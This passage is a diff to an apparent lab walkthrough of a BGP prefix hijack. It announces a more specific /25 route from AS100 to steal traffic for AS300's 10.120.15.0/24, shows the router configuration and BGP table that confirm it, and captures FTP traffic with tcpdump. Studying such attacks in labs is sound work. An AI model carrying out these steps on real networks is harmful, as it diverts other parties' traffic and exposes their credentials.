@@ -350,12 +350,102 @@ From our network  recon we have got the following information:
 
 ##### Prefix Hijacking Attacks
 
-BGP always favors the shortest, most specific path to the desired IP address. In order for the BGP hijack to be successful, the route announcement must either:
+BGP always favors the shortest, most specific path to the desired IP address. In order for the BGP hijack to be successful, the route announcement must either Offer a more specific route by announcing a smaller range of IP addresses than other ASes had previously announced or Offer a shorter route to certain blocks of IP addresses.
 
-1) Offer a more specific route by announcing a smaller range of IP addresses than other ASes had previously announced.
-2) Offer a shorter route to certain blocks of IP addresses.
+###### Attack Plan
 
-+ We need to advertise a route to the other autonomous systems (AS) stating that we R1,AS100) know how to reach that destination. 
-+ AS300 is advertising routes for 10.120.15.0/24 network, so we will advertise a more specific route that supersedes AS300 route and our route to the neighour routers routing tables. 
++ We need to advertise a route to the other(AS) stating that AS100 know how to reach the 10.120.15.0/24
++ As AS300 is advertising routes for 10.120.15.0/24 network, so we will advertise a more specific route that supersedes AS300 route and add our route to the neighour routers routing tables. This way traffic should be routed to AS100.
 + We will advertise a route with a larger prefix, we’ll advertise 10.120.15.0/25.
 
+Lets change the configuration of R1. Add network 10.120.15.0/25
+
+```python
+
+r1# conf t
+  conf t
+  r1(config)# ip route 10.120.15.0/25 10.78.11.2
+  ip route 10.120.15.0/25 10.78.11.2
+  r1(config)# router bgp 100
+  router bgp 100
+  r1(config-router)# network 10.120.15.0/25
+  network 10.120.15.0/25
+  r1(config-router)# end
+  end
+  r1# show ip bgp
+  ```
+  If we check BGP routes we can confirm our 10.120.15.0/25 network is successfully added.
+  
+```python
+  
+  r1# show ip bgp
+show ip bgp
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
+*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
+*  10.100.10.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.11.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.12.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.13.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.14.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.15.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.16.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.17.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.18.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.19.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*  10.100.20.0/24   10.78.11.2                             0 300 200 i
+*>                  10.78.10.2               0             0 200 i
+*> 10.101.8.0/21    0.0.0.0                  0         32768 i
+*> 10.101.16.0/21   0.0.0.0                  0         32768 i
+*  10.120.10.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.11.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.12.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.13.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.14.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*> 10.120.15.0/24   0.0.0.0                  0         32768 ?
+*                   10.78.10.2                             0 200 300 i
+*                   10.78.11.2               0             0 300 i
+*> 10.120.15.0/25   0.0.0.0                  0         32768 i
+*  10.120.16.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.17.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.18.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.19.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+*  10.120.20.0/24   10.78.10.2                             0 200 300 i
+*>                  10.78.11.2               0             0 300 i
+
+Total number of prefixes 27
+```
+
+
+Start capturing FTP traffic
+```python
+
+root@r1:~# tcpdump -A -i any port 21 -vv -w ftp.pcap    
+tcpdump -A -i any port 21 -vv -w ftp.pcap
+tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
+Got 52
+```
